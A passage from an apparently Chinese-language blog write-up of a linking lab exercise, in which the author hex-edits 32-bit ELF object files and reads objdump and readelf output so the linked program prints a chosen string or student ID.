<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">83</span>  EC <span class="number">0</span>C <span class="number">52</span> <span class="number">89</span>  C3 E8 FC FF  FF FF <span class="number">83</span> C4  ......R.........</span><br><span class="line"><span class="number">00000060</span>   <span class="number">10</span> <span class="number">90</span> <span class="number">8B</span> <span class="number">5</span>D  FC C9 C3 <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ...]............</span><br><span class="line"><span class="number">00000070</span>   <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00000080</span>   <span class="number">37</span> <span class="number">30</span> <span class="number">6</span>C <span class="number">4</span>C  <span class="number">39</span> <span class="number">46</span> <span class="number">39</span> <span class="number">09</span>  <span class="number">39</span> <span class="number">68</span> <span class="number">6B</span> <span class="number">52</span>  <span class="number">58</span> <span class="number">55</span> <span class="number">38</span> <span class="number">41</span>  <span class="number">70l</span>L9F9<span class="number">.9</span>hkRXU8A</span><br><span class="line"><span class="number">00000090</span>   <span class="number">31</span> <span class="number">31</span> <span class="number">37</span> <span class="number">33</span>  <span class="number">30</span> <span class="number">30</span> <span class="number">30</span> <span class="number">32</span>  <span class="number">30</span> <span class="number">39</span> <span class="number">55</span> <span class="number">56</span>  <span class="number">76</span> <span class="number">30</span> <span class="number">30</span> <span class="number">64</span>  <span class="number">1173000209U</span>Vv00d</span><br><span class="line"><span class="number">000000</span>A0   <span class="number">33</span> <span class="number">76</span> <span class="number">79</span> <span class="number">46</span>  <span class="number">41</span> <span class="number">4</span>C <span class="number">75</span> <span class="number">4</span>D  <span class="number">59</span> <span class="number">6</span>A <span class="number">78</span> <span class="number">75</span>  <span class="number">50</span> <span class="number">43</span> <span class="number">72</span> <span class="number">35</span>  <span class="number">3</span>vyFALuMYjxuPCr5</span><br><span class="line"><span class="number">000000B</span>0   <span class="number">6</span>D <span class="number">33</span> <span class="number">38</span> <span class="number">75</span>  <span class="number">69</span> <span class="number">69</span> <span class="number">77</span> <span class="number">4</span>C  <span class="number">51</span> <span class="number">77</span> <span class="number">6</span>C <span class="number">7</span>A  <span class="number">52</span> <span class="number">78</span> <span class="number">72</span> <span class="number">38</span>  m38uiiwLQwlzRxr8</span><br><span class="line"><span class="number">000000</span>C0   <span class="number">30</span> <span class="number">42</span> <span class="number">78</span> <span class="number">59</span>  <span class="number">6</span>E <span class="number">76</span> <span class="number">37</span> <span class="number">72</span>  <span class="number">36</span> <span class="number">7</span>A <span class="number">7</span>A <span class="number">39</span>  <span class="number">61</span> <span class="number">43</span> <span class="number">68</span> <span class="number">4</span>D  <span class="number">0B</span>xYnv7r6zz9aChM</span><br><span class="line"><span class="number">000000</span>D0   <span class="number">76</span> <span class="number">57</span> <span class="number">6F</span> <span class="number">75</span>  <span class="number">32</span> <span class="number">44</span> <span class="number">4</span>C <span class="number">39</span>  <span class="number">65</span> <span class="number">34</span> <span class="number">74</span> <span class="number">63</span>  <span class="number">36</span> <span class="number">45</span> <span class="number">69</span> <span class="number">64</span>  vWou2DL9e4tc6Eid</span><br><span class="line"><span class="number">000000E0</span>   <span class="number">46</span> <span class="number">31</span> <span class="number">6F</span> <span class="number">6</span>C  <span class="number">68</span> <span class="number">71</span> <span class="number">72</span> <span class="number">68</span>  <span class="number">48</span> <span class="number">33</span> <span class="number">67</span> <span class="number">78</span>  <span class="number">59</span> <span class="number">43</span> <span class="number">68</span> <span class="number">41</span>  F1olhqrhH3gxYChA</span><br><span class="line"><span class="number">000000F</span>0   <span class="number">63</span> <span class="number">6B</span> <span class="number">4</span>D <span class="number">6F</span>  <span class="number">37</span> <span class="number">75</span> <span class="number">4</span>D <span class="number">58</span>  <span class="number">4</span>A <span class="number">48</span> <span class="number">77</span> <span class="number">53</span>  <span class="number">44</span> <span class="number">66</span> <span class="number">69</span> <span class="number">45</span>  ckMo7uMXJHwSDfiE</span><br><span class="line"><span class="number">00000100</span>   <span class="number">6</span>D <span class="number">6</span>C <span class="number">59</span> <span class="number">48</span>  <span class="number">09</span> <span class="number">68</span> <span class="number">68</span> <span class="number">4</span>A  <span class="number">45</span> <span class="number">6</span>C <span class="number">49</span> <span class="number">6</span>C  <span class="number">20</span> <span class="number">52</span> <span class="number">7</span>A <span class="number">43</span>  mlYH.hhJElIl RzC</span><br><span class="line"><span class="number">00000110</span>   <span class="number">57</span> <span class="number">4B</span> <span class="number">50</span> <span class="number">63</span>  <span class="number">75</span> <span class="number">4</span>E <span class="number">76</span> <span class="number">64</span>  <span class="number">48</span> <span class="number">41</span> <span class="number">49</span> <span class="number">74</span>  <span class="number">09</span> <span class="number">68</span> <span class="number">37</span> <span class="number">34</span>  WKPcuNvdHAIt.h74</span><br><span class="line"><span class="number">00000120</span>   <span class="number">38</span> <span class="number">37</span> <span class="number">7</span>A <span class="number">6B</span>  <span class="number">64</span> <span class="number">33</span> <span class="number">39</span> <span class="number">51</span>  <span class="number">4</span>A <span class="number">45</span> <span class="number">6</span>D <span class="number">34</span>  <span class="number">52</span> <span class="number">71</span> <span class="number">77</span> <span class="number">79</span>  <span class="number">87</span>zkd39QJEm4Rqwy</span><br><span class="line"><span class="number">00000130</span>   <span class="number">65</span> <span class="number">72</span> <span class="number">09</span> <span class="number">4</span>C  <span class="number">20</span> <span class="number">30</span> <span class="number">67</span> <span class="number">61</span>  <span class="number">75</span> <span class="number">7</span>A <span class="number">31</span> <span class="number">4</span>E  <span class="number">32</span> <span class="number">77</span> <span class="number">39</span> <span class="number">67</span>  er.L <span class="number">0</span>gauz1N2w9g</span><br><span class="line"><span class="number">00000140</span>   <span class="number">20</span> <span class="number">50</span> <span class="number">79</span> <span class="number">61</span>  <span class="number">48</span> <span class="number">41</span> <span class="number">6</span>C <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">8B</span> <span class="number">04</span> <span class="number">24</span> C3   PyaHAl.......$.</span><br><span class="line"><span class="number">00000150</span>   <span class="number">00</span> <span class="number">47</span> <span class="number">43</span> <span class="number">43</span>  <span class="number">3</span>A <span class="number">20</span> <span class="number">28</span> <span class="number">55</span>  <span class="number">62</span> <span class="number">75</span> <span class="number">6</span>E <span class="number">74</span>  <span class="number">75</span> <span class="number">20</span> <span class="number">37</span> <span class="number">2</span>E  .GCC: (Ubuntu <span class="number">7.</span></span><br><span class="line"><span class="number">00000160</span>   <span class="number">33</span> <span class="number">2</span>E <span class="number">30</span> <span class="number">2</span>D  <span class="number">31</span> <span class="number">36</span> <span class="number">75</span> <span class="number">62</span>  <span class="number">75</span> <span class="number">6</span>E <span class="number">74</span> <span class="number">75</span>  <span class="number">33</span> <span class="number">29</span> <span class="number">20</span> <span class="number">37</span>  <span class="number">3.0</span><span class="number">-16u</span>buntu3) <span class="number">7</span></span><br><span class="line"><span class="number">00000170</span>   <span class="number">2</span>E <span class="number">33</span> <span class="number">2</span>E <span class="number">30</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">.3</span><span class="number">.0</span>............</span><br><span class="line">---  phase1.o       -<span class="number">-0x0</span>/<span class="number">0x670</span>------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>可以发现 printf 并没有从变量 ALJsLxmF 的头部开始打印，对原字符串进行搜索，发现偏移多了“0x11”，利用 objdump 反汇编进行检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l1] objdump -d phase1.o</span><br><span class="line"></span><br><span class="line">phase1.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;do_phase&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line">   <span class="number">1</span>:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line">   <span class="number">3</span>:	<span class="number">53</span>                   	push   %ebx</span><br><span class="line">   <span class="number">4</span>:	<span class="number">83</span> ec <span class="number">04</span>             	sub    $<span class="number">0x4</span>,%esp</span><br><span class="line">   <span class="number">7</span>:	e8 fc ff ff ff       	call   <span class="number">8</span> &lt;do_phase+<span class="number">0x8</span>&gt;</span><br><span class="line">   c:	<span class="number">05</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	add    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">11</span>:	<span class="number">8</span>d <span class="number">90</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	lea    <span class="number">0x11</span>(%eax),%edx </span><br><span class="line">      <span class="comment">// lea 取源操作数地址的偏移量，并把它传送到目的操作数所在的单元</span></span><br><span class="line">  <span class="number">17</span>:	<span class="number">83</span> ec <span class="number">0</span>c             	sub    $<span class="number">0xc</span>,%esp </span><br><span class="line">  <span class="number">1</span>a:	<span class="number">52</span>                   	push   %edx</span><br><span class="line">  <span class="number">1b</span>:	<span class="number">89</span> c3                	mov    %eax,%ebx</span><br><span class="line">  <span class="number">1</span>d:	e8 fc ff ff ff       	call   <span class="number">1</span>e &lt;do_phase+<span class="number">0x1e</span>&gt;</span><br><span class="line">  <span class="number">22</span>:	<span class="number">83</span> c4 <span class="number">10</span>             	add    $<span class="number">0x10</span>,%esp</span><br><span class="line">  <span class="number">25</span>:	<span class="number">90</span>                   	nop</span><br><span class="line">  <span class="number">26</span>:	<span class="number">8b</span> <span class="number">5</span>d fc             	mov    <span class="number">-0x4</span>(%ebp),%ebx</span><br><span class="line">  <span class="number">29</span>:	c9                   	leave  </span><br><span class="line">  <span class="number">2</span>a:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">Disassembly of section .text.__x86.get_pc_thunk.ax:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;__x86.get_pc_thunk.ax&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">8b</span> <span class="number">04</span> <span class="number">24</span>             	mov    (%esp),%eax</span><br><span class="line">   <span class="number">3</span>:	c3                   	ret   </span><br></pre></td></tr></table></figure>
<p>现在可以用 HexEdit 修改二进制数据了，我将把它改为 “YHellow”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l1] gcc -m32 -o linkbomb main.o phase1.o </span><br><span class="line">➜  [/home/ywhkkx/ex1.linklab/l1] ./linkbomb</span><br><span class="line">YHellow</span><br></pre></td></tr></table></figure>
<h2 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h2><p>修改二进制可重定位目标文件 phase2.o 的代码节内容，使其与 main.o 链接后能够运行输出（且仅输出）自己的学号</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span> </span></span><br><span class="line"><span class="keyword">void</span> (*phase)();   <span class="comment">/*初始化为0*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[] )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( phase )</span><br><span class="line">               (*phase)();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;To run lab, please link the relevant object module with the main module.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">OUTPUT_FUNC_NAME</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *id)</span>     <span class="comment">// 该函数名对每名学生均不同</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(id,MYID) != <span class="number">0</span> ) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_phase</span><span class="params">()</span>  </span>&#123;</span><br><span class="line">        <span class="comment">// 在代码节中预留存储位置供学生插入完成功能的必要指令</span></span><br><span class="line">        <span class="keyword">asm</span>( “nop\n\tnop\n\tnop\n\tnop\n\tnop\n\tnop\n\tnop\n\tnop\n\t…” );     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​        // 这个实验要求我们在 do_phase 中执行 OUTPUT_FUNC_NAME，打印 ID</p>
<p>步骤一：使用 objdump 工具，定位 phase2.o 代码节中包含对 printf（会被优化为 puts）输出函数调用的函数的偏移量地址</p>
<p>步骤二：使用 objdump 工具，分析 do_phase 函数的反汇编指令，确定加入对前述输出函数的调用指令的 .text 节中的偏移量位置</p>
<p>步骤三：构造调用输出函数（通过相对PC的偏移量）的机器指令，并替换 do_phase 函数中预留的 nop 指令偏移量</p>
<p>注：目标输出函数为 static 类型，可通过偏移量直接调用跳转（无需重定位）</p>
<p>直接执行程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l2] ./linkbomb2 <span class="comment">// 啥也没有(本来也不该有)</span></span><br></pre></td></tr></table></figure>
<p>信息收集：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l2] file linkbomb2 </span><br><span class="line">linkbomb2: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">32f</span>a54a562f55fda7e482d48180dc3e162fcea98, <span class="keyword">not</span> stripped</span><br></pre></td></tr></table></figure>
<p>发现 linkbomb2 是 dynamically，函数采用懒加载（利用PLT/GOT进行加载）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l2] readelf -s phase2.o  </span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">22</span> entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">00000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS phase2.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">3</span> </span><br><span class="line">     <span class="number">3</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">5</span> </span><br><span class="line">     <span class="number">4</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">6</span> </span><br><span class="line">     <span class="number">5</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">7</span> </span><br><span class="line">     <span class="number">6</span>: <span class="number">00000000</span>    <span class="number">65</span> FUNC    LOCAL  DEFAULT    <span class="number">3</span> yeDfwUkv</span><br><span class="line">     <span class="number">7</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">8</span> </span><br><span class="line">     <span class="number">8</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">10</span> </span><br><span class="line">     <span class="number">9</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">11</span> </span><br><span class="line">    <span class="number">10</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">13</span> </span><br><span class="line">    <span class="number">11</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">14</span> </span><br><span class="line">    <span class="number">12</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT   <span class="number">12</span> </span><br><span class="line">    <span class="number">13</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> </span><br><span class="line">    <span class="number">14</span>: <span class="number">00000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">2</span> </span><br><span class="line">    <span class="number">15</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">11</span> __x86.get_pc_thunk.bx</span><br><span class="line">    <span class="number">16</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    <span class="number">17</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">strcmp</span></span><br><span class="line">    <span class="number">18</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">puts</span></span><br><span class="line">    <span class="number">19</span>: <span class="number">00000041</span>    <span class="number">48</span> FUNC    GLOBAL DEFAULT    <span class="number">3</span> do_phase <span class="comment">// target</span></span><br><span class="line">    <span class="number">20</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">10</span> __x86.get_pc_thunk.ax</span><br><span class="line">    <span class="number">21</span>: <span class="number">00000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">8</span> phase</span><br></pre></td></tr></table></figure>
<p>目标在：第3节，节内偏移为“0x41”的地方</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l2] readelf -S phase2.o</span><br><span class="line">There are <span class="number">19</span> section headers, starting at offset <span class="number">0x458</span>:</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>            <span class="number">00000000</span> <span class="number">000000</span> <span class="number">000000</span> <span class="number">00</span>      <span class="number">0</span>   <span class="number">0</span>  <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .group            GROUP           <span class="number">00000000</span> <span class="number">000034</span> <span class="number">000008</span> <span class="number">04</span>     <span class="number">16</span>  <span class="number">20</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">2</span>] .group            GROUP           <span class="number">00000000</span> <span class="number">00003</span>c <span class="number">000008</span> <span class="number">04</span>     <span class="number">16</span>  <span class="number">15</span>  <span class="number">4</span></span><br><span class="line">  [ <span class="number">3</span>] .text             PROGBITS        <span class="number">00000000</span> <span class="number">000044</span> <span class="number">000071</span> <span class="number">00</span>  AX  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>在 .text 节中找到指定的 do_phase 位置（需要修改的函数），偏移为“0x44+0x41”（注意，puts，strcmp等函数是要在链接重定向完成之后才能确定地址，在反汇编代码中显示出来）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span>   <span class="number">7F</span> <span class="number">45</span> <span class="number">4</span>C <span class="number">46</span>  <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  .ELF............</span><br><span class="line"><span class="number">00000010</span>   <span class="number">01</span> <span class="number">00</span> <span class="number">03</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00000020</span>   <span class="number">58</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">34</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">28</span> <span class="number">00</span>  X......<span class="number">.4</span>.....(.</span><br><span class="line"><span class="number">00000030</span>   <span class="number">13</span> <span class="number">00</span> <span class="number">12</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">0</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line"><span class="number">00000040</span>   <span class="number">0B</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">55</span> <span class="number">89</span> E5 <span class="number">53</span>  <span class="number">83</span> EC <span class="number">04</span> E8  FC FF FF FF  ....U..S........</span><br><span class="line"><span class="number">00000050</span>   <span class="number">81</span> C3 <span class="number">02</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">83</span> EC  <span class="number">08</span> <span class="number">8</span>D <span class="number">83</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">50</span>  ...............P</span><br><span class="line"><span class="number">00000060</span>   FF <span class="number">75</span> <span class="number">08</span> E8  FC FF FF FF  <span class="number">83</span> C4 <span class="number">10</span> <span class="number">85</span>  C0 <span class="number">75</span> <span class="number">10</span> <span class="number">83</span>  .u...........u..</span><br><span class="line"><span class="number">00000070</span>   EC <span class="number">0</span>C FF <span class="number">75</span>  <span class="number">08</span> E8 FC FF  FF FF <span class="number">83</span> C4  <span class="number">10</span> EB <span class="number">01</span> <span class="number">90</span>  ...u............</span><br><span class="line"><span class="number">00000080</span>   <span class="number">8B</span> <span class="number">5</span>D FC C9  C3 <span class="number">55</span> <span class="number">89</span> E5  E8 FC FF FF  FF <span class="number">05</span> <span class="number">01</span> <span class="number">00</span>  .]...U..........</span><br><span class="line"><span class="number">00000090</span>   <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">90</span>  <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span>  <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span>  <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span>  ................</span><br><span class="line"><span class="number">000000</span>A0   <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span>  <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span>  <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span>  <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span>  ................</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000041</span> &lt;do_phase&gt;:</span><br><span class="line">  <span class="number">41</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line">  <span class="number">42</span>:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line">  <span class="number">44</span>:	e8 fc ff ff ff       	call   <span class="number">45</span> &lt;do_phase+<span class="number">0x4</span>&gt;</span><br><span class="line">  <span class="number">49</span>:	<span class="number">05</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	add    $<span class="number">0x1</span>,%eax</span><br><span class="line">  <span class="number">4</span>a:	<span class="number">90</span>					   nop</span><br><span class="line">  <span class="number">4b</span>:	<span class="number">90</span>					   nop</span><br><span class="line">  <span class="number">4</span>c:	<span class="number">90</span>					   nop</span><br><span class="line">  <span class="number">4</span>d:	<span class="number">90</span>					   nop</span><br></pre></td></tr></table></figure>
<p>在“0x86”处发现 do_phase （55 89 e5 e8 …….. ）</p>
<p>先输入：gcc -m32 -o linkbomb2 main.o phase2.o 进行链接重定向（phase2.o 没有变）</p>
<p>然后用 objdump 进行打印：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">➜  [/home/ywhkkx/ex1.linklab/l2] objdump -d linkbomb2 </span><br><span class="line"></span><br><span class="line">....................</span><br><span class="line"></span><br><span class="line"><span class="number">00001215</span> &lt;yeDfwUkv&gt;:</span><br><span class="line">    <span class="number">1215</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line">    <span class="number">1216</span>:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line">    <span class="number">1218</span>:	<span class="number">53</span>                   	push   %ebx</span><br><span class="line">    <span class="number">1219</span>:	<span class="number">83</span> ec <span class="number">04</span>             	sub    $<span class="number">0x4</span>,%esp</span><br><span class="line">    <span class="number">121</span>c:	e8 <span class="number">9f</span> fe ff ff       	call   <span class="number">10</span>c0 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">    <span class="number">1221</span>:	<span class="number">81</span> c3 b3 <span class="number">2</span>d <span class="number">00</span> <span class="number">00</span>    	add    $<span class="number">0x2db3</span>,%ebx</span><br><span class="line">    <span class="number">1227</span>:	<span class="number">83</span> ec <span class="number">08</span>             	sub    $<span class="number">0x8</span>,%esp</span><br><span class="line">    <span class="number">122</span>a:	<span class="number">8</span>d <span class="number">83</span> a8 e0 ff ff    	lea    <span class="number">-0x1f58</span>(%ebx),%eax</span><br><span class="line">    <span class="number">1230</span>:	<span class="number">50</span>                   	push   %eax</span><br><span class="line">    <span class="number">1231</span>:	ff <span 